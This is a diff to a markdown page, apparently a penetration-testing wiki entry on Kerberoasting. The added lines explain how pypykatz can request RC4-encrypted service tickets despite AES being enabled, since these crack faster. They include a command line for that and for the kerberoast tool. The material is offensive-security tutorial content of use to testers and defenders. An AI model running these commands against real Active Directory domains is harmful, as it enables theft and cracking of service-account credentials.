@@ -41,6 +41,13 @@ Another alternative is the [kerberoast](https://github.com/skelsec/kerberoast) p
 ```bash
 python3 kerberoast spnroast kerberos+pass://"domain"\\"user":"password"@"target" -u "target_user" -r "realm"
 ```
+
+Using [pypykatz](https://github.com/skelsec/pypykatz/wiki/Kerberos-spnroast-command) it is possible to request an RC4 encrypted ST even when AES encryption is enabled. Trying to crack `$krb5tgs$23` takes less time than for `krb5tgs$18`.
+
+```bash
+python3 pypykatz kerberos spnroast 'kerberos+password://DOMAIN\username:Password@IP' -d domain -t target_user
+```
+
 {% endtab %}
 
 {% tab title="Windows" %}
